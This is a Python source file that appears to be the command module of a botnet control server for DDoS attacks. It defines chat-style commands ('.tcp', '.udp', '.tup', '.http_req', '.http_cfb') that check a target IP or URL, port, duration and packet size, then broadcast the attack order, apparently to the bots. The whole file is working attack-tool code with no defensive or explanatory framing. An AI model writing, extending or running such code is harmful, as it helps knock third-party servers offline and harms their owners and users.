from colorama import Fore
import random

def tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .tup [IP] [PORT] [TIME] [SIZE]')

def tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')

def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    if validate_size(size):
                        send(client, ansi_clear, False)
                        attack_sent2(ip, port, secs, size, client)
                        broadcast(data)
                    else:
                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')

def http_req(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_req [URL] [HTTP_METHODS] [TIME]')

def http_cfb(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        method = args[2]
        secs = args[3]
        if validate_time(secs):
            send(client, ansi_clear, False)
            attack_sent1(ip,"80/443", secs, client)
            broadcast(data)
        else:
            send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
    else:
        send(client, 'Usage: .http_cfb [URL] [HTTP_METHODS] [TIME]')
